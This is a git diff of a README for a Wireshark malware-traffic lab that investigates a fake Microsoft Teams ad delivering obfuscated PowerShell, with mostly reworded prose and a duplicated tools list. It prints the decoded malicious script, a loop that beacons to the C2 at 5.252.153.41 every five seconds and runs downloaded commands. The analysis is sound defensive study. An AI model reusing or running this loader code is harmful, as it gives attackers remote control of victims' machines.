@@ -1,25 +1,26 @@
 # **Wireshark Malware Traffic Analysis Lab**
 
 ## **Overview**
-This lab focuses on analyzing network traffic to identify indicators of infection on a Windows client using **Wireshark**. The analysis is based on a **packet capture (PCAP) file** provided by [Malware Traffic Analysis](https://malware-traffic-analysis.net). The exercise follows a real-world malware investigation scenario, where we will examine network traffic, extract relevant artifacts, and answer key incident response questions. **important The answer sheet for this post-infection analysis uses a different pcap than the one provided in the link above. hence we cannot use it to validate our answers.**
+This lab focuses on the analysis of network traffic to identify indicators of infection on a Windows client using Wireshark. The analysis leverages a packet capture (PCAP) file sourced from Malware Traffic Analysis, reflecting a realistic malware investigation scenario. Throughout the exercise, we examine network traffic, extract pertinent artifacts, and systematically address essential incident response questions.
 
-The specific exercise being analyzed can be found here:  
-[Malware Traffic Analysis Exercise - January 22, 2025](https://malware-traffic-analysis.net/2025/01/22/index.html).
+Important Note: The provided answer sheet for post-infection analysis references a different PCAP file than the one used in this analysis. Consequently, we cannot utilize it for validating our findings.
 
-The purpose of this lab is educational. The aim is to gain hands-on experience with the investigative steps required to identify indicators of compromise (IOCs) in a network capture, while addressing realistic threats relevant to 2025.
+The detailed exercise referenced in this lab is available here:
+Malware Traffic Analysis Exercise - January 22, 2025
 
-In this lab, I simulate a network infection scenario involving a fake Microsoft Teams advertisement delivering a malicious PowerShell script. The analysis focuses on identifying the infected host, C2 server, and malicious payload delivery mechanisms using Wireshark. Because the pcap available on the website does not contain the activities necessary to identify question 5 and 6 from the http requests, this lead to an interesting activity to dig deeper into the malicious payload downloaded. I was able to decode the powersheell script by de-obfuscating the string, and using a base 64 decoding algorithm
+The primary goal of this lab is educational, aiming to provide hands-on experience with investigative methods necessary for identifying indicators of compromise (IOCs) within network captures, specifically targeting contemporary cyber threats relevant to 2025.
 
-From the malicious powershell script, we were able to find that the malware uses the infected machine's C drive serial number to create a unique identifier for the host. We also found that the malware has its C2(Command & Control) server at 5.252.153.41 because it contacts this server every 5 second in an inifite loop.
+In this scenario, we simulate a network infection initiated through a deceptive Microsoft Teams advertisement that delivers a malicious PowerShell script. The analysis is dedicated to identifying critical elements, including the infected host, command-and-control (C2) server, and the mechanisms employed for payload delivery using Wireshark. Interestingly, the PCAP available on the source website lacked certain activities necessary to answer questions 5 and 6 relating to specific HTTP requests. This gap provided an opportunity for deeper investigative activities into the malicious payload. Through careful analysis, the PowerShell script was successfully decoded by de-obfuscating the encoded string and applying Base64 decoding techniques.
 
+The investigation of the malicious PowerShell script revealed that the malware leverages the infected machine's C-drive serial number as a unique host identifier. Furthermore, it was determined that the malware communicates continuously every five seconds with its command-and-control server hosted at IP address 5.252.153.41, demonstrating classic beaconing behavior.
 
-Tools Used:
+Tools Utilized:
+
 Host-only Linux VM (Kali-based)
 
 Wireshark (for PCAP analysis)
 
-ChatGPT (used to assist in deobfuscating scripts, decoding payloads, and interpreting attack logic)
-
+ChatGPT (for assistance in script de-obfuscation, payload decoding, and interpreting attack logic)
 
 ## **Scenario**
 As a **Security Operations Center (SOC) analyst**, you receive a report from a user who claims that a coworker has downloaded a suspicious file after searching for **Google Authenticator**. The caller provides supporting details that align with reports shared on social media:
@@ -93,14 +94,15 @@ Using AI, I decoded the ps1 file found in the objects of the pcap, and found tha
 
 
 ### Finding and decoding the malicious powershell script
-When looking to find the malicious powershell script that was connecting to the C2 server, I found a powershell script in the list of objects on the PCAP file
+Upon examining the network capture file, I discovered a suspicious PowerShell script among the listed objects. 
 
 ![image](https://github.com/user-attachments/assets/b364d061-7b4b-47ca-a83d-0981d9778004)
 
-When I opened the script, I found that it does not look like code, but rather a cypher. I used AI to understand how to decode the cypher. I understood that the cypher contained characters to obfuscate(these can be found from the first and last line of the ps1 file). I also understood that the remainder of the code is in base-64 encoding.
-the code to extract the malicious code in found here: https://github.com/yasserhous/PCAP-Analysis-with-Wireshark/blob/Master/decoder.py
+Upon opening the extracted script, it appeared heavily obfuscated, resembling a cipher rather than typical code. Utilizing artificial intelligence tools, I identified that the script contained extraneous characters intended solely for obfuscation, clearly indicated by the first and last lines of the PowerShell file. Further analysis confirmed that the core payload was encoded in Base64.
 
-The malicious code is the following:
+The Python script developed for decoding and extracting the malicious payload can be found here: decoder.py.
+
+The decoded malicious PowerShell script is:
 ```bash
 $fso = New-Object -Com "Scripting.FileSystemObject"
 $SerialNumber = $fso.GetDrive("c:\").SerialNumber
@@ -122,8 +124,15 @@ while ($true) {
     Start-Sleep -s 5
 }
 ```
-As mentioned prior, the script creates a unique URL for the infected machine "$url = $ip+$serial" , and then through an infinite loop, it attempts to contact home ( $result=$s.DownloadString($url)) every 5 seconds.
+As previously described, the script generates a unique URL for the infected host by concatenating the IP address of the C2 server with the infected machine's C-drive serial number ($url = $ip+$serial). It then enters an infinite loop, persistently attempting to download and execute commands from the C2 server ($result=$s.DownloadString($url)) every five seconds.
 
+Tools Utilized:
+
+Host-only Linux VM (Kali-based)
+
+Wireshark (for PCAP analysis)
+
+ChatGPT (for assistance in script de-obfuscation, payload decoding, and interpreting attack logic)
 
 
 sources:
